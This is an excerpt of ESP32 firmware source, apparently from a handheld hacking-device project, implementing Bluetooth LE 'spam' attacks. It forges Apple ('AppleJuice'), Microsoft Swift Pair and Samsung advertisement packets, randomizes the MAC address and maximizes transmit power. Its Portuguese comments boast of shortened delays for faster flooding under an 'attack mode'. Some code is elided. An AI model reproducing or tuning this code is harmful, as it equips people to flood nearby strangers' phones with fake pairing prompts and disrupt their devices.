#include "ble_spam.h"
#include "ble_optimizations.h" // Módulo de otimizações BLE
...
// OTIMIZADO: Uso de buffer estático para evitar malloc/free repetitivo e leak de memória
static char _randomNameBuffer[12];
const char *generateRandomName() {
    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int len = (esp_random() % 10) + 1; // Generate a random length between 1 and 10

    for (int i = 0; i < len; ++i) {
        // Select random characters from the charset
        _randomNameBuffer[i] = charset[esp_random() % 52];
    }
    _randomNameBuffer[len] = '\0'; // Null-terminate the string
    return _randomNameBuffer;
}
...
BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
    ...
    switch (Type) {
        case Microsoft: {
            ...
            // OTIMIZADO: Uso de buffer stack em vez de heap se pequeno, ou vector
            uint8_t buff[32];
            if (name_len > 24) name_len = 24; // Limit name length
            ...
            buff[idx++] = 0x00;
            buff[idx++] = 0x80;
            memcpy(&buff[idx], Name, name_len);

#ifdef NIMBLE_V2_PLUS
            AdvData.addData(buff, 7 + name_len);
#else
            AdvData.addData(std::string((char *)buff, 7 + name_len));
#endif
            break;
        }
        case AppleJuice: {
            int rand_choice = esp_random() % 2; // Otimizado: esp_random
            if (rand_choice == 0) {
                // OTIMIZADO: Payload expandido de BLE_OPT_APPLE_DEVICES
                uint8_t dev_id = BLE_OPT_APPLE_DEVICES[esp_random() % BLE_OPT_APPLE_COUNT];
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, dev_id, 0x20, 0x75, 0xaa,
                ...
                // OTIMIZADO: Payload expandido de BLE_OPT_APPLE_TV
                uint8_t dev_id = BLE_OPT_APPLE_TV[esp_random() % BLE_OPT_APPLE_TV_COUNT];
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04,   0x2a, 0x00,
                                      0x00, 0x00, 0x0f, 0x05, 0xc1, dev_id, 0x60, 0x4c,
        ...
        case Samsung: {
            // OTIMIZADO: Payload expandido de BLE_OPT_SAMSUNG_WATCH
            uint8_t model = BLE_OPT_SAMSUNG_WATCH[esp_random() % BLE_OPT_SAMSUNG_COUNT];
        ...
        default: {
            LOG_BLE("Please Provide a Company Type");
            break;
        }
    }
...
//// https://github.com/Spooks4576
// OTIMIZADO: Delays reduzidos de 70ms para 20ms total
void executeSpam(EBLEPayloadType type) {
    uint8_t macAddr[6];
    ble_opt_random_mac(macAddr); // MAC randomization otimizada
    esp_base_mac_addr_set(macAddr);
    BLEDevice::init("");
    vTaskDelay(BLE_OPT_INIT_DELAY / portTICK_PERIOD_MS); // 5ms (era 10ms)
    ble_opt_set_max_power();                             // TX power máximo em todos os modos
    pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = GetUniversalAdvertisementData(type);
    BLEAdvertisementData oScanResponseData = BLEAdvertisementData();
    NimBLEUUID uuid((uint32_t)(esp_random() & 0xFFFFFF));
    pAdvertising->addServiceUUID(uuid);
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->setScanResponseData(oScanResponseData);
    pAdvertising->start();
    vTaskDelay(BLE_OPT_ADV_DELAY_FAST / portTICK_PERIOD_MS); // 10ms (era 50ms)
    pAdvertising->stop();
    vTaskDelay(BLE_OPT_STOP_DELAY / portTICK_PERIOD_MS); // 5ms (era 10ms)
    BLEDevice::deinit();
}
...
void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    ...
    while (!check(AnyKeyPress)) {
        ...
        LOG_BLE("Advertizing stop");
    }

    BLEDevice::deinit();
}

// OTIMIZADO: Loop mais rápido (100ms -> 20ms)
void aj_adv(int ble_choice) {
    ...
    ble_opt_enable_attack_mode(); // Ativa modo de ataque (logs OFF, CPU 240MHz)
    timer = millis();
    while (1) {
        if (millis() - timer > BLE_OPT_LOOP_INTERVAL) { // 20ms (era 100ms)
